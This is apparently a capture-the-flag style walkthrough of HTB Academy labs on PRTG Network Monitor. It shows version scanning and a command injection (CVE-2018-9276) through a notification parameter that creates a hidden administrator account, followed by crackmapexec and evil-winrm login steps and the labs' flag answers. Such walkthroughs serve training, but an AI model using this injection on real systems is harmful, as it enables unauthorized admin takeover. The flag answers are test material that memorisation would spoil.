# ⚔️ PRTG Network Monitor Attacks

> **🎯 Objective:** Exploit PRTG Network Monitor's command injection vulnerability (CVE-2018-9276) for authenticated remote code execution through notification system abuse.

## Overview

PRTG Network Monitor is an agentless network monitoring software running on Windows. Common ports: **80, 443, 8080**. Vulnerable versions **< 18.2.39** suffer from authenticated command injection in notification parameters.

---

## HTB Academy Lab Solutions

### Lab 1: Version Discovery
**Question:** "What version of PRTG is running on the target?"

```bash
# Nmap service detection
nmap -A -Pn STMIP

# Result shows:
# 8080/tcp open  http  Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
# |_http-server-header: PRTG/18.1.37.13946
```

**Answer:** `18.1.37.13946`

### Lab 2: RCE via Command Injection
**Question:** "Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop."

#### Step 1: Access PRTG Interface
```bash
# Navigate to: https://STMIP:8080
# Login: prtgadmin:Password123
```

#### Step 2: Create Malicious Notification
1. **Setup** → **Account Settings** → **Notifications**
2. **Add new notification** (name: any)
3. Enable **"Execute Program"**
4. **Program File:** `Demo exe notification - outfile.ps1`
5. **Parameter:** 
```powershell
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
6. **Save** notification

#### Step 3: Execute Command Injection
- Click **Test** button to trigger notification
- Command executes: creates user + adds to administrators

#### Step 4: Verify Access
```bash
# Test new admin user
sudo crackmapexec smb STMIP -u prtgadm1 -p 'Pwn3d_by_PRTG!'
# Expected: (Pwn3d!) - confirms admin access
```

#### Step 5: Remote Access & Flag
```bash
# Connect via Evil-WinRM
evil-winrm -i STMIP -u prtgadm1 -p 'Pwn3d_by_PRTG!'

# Read flag
type C:\Users\Administrator\Desktop\flag.txt
```

**Answer:** `WhOs3_m0nit0ring_wH0?`

---

## Attack Summary

**Vulnerability:** CVE-2018-9276 - Authenticated Command Injection  
**Method:** Notification parameter injection → PowerShell execution  
**Requirements:** Valid PRTG credentials  
**Impact:** Full system compromise with administrative privileges  

**💡 Key Point:** PRTG notification system directly passes parameters to PowerShell without sanitization, enabling arbitrary command execution. 